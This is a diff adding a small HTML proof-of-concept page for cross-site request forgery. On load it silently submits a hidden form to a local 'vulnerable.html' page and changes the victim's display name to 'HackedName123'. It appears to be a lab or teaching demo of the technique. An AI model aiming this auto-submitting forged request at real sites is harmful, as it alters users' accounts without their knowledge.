@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC - Change Name</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h2>CSRF PoC: Change Display Name</h2>
+
+  <form action="http://localhost/vulnerable.html" method="GET">
+    <input type="hidden" name="name" value="HackedName123" />
+  </form>
+</body>
+</html>
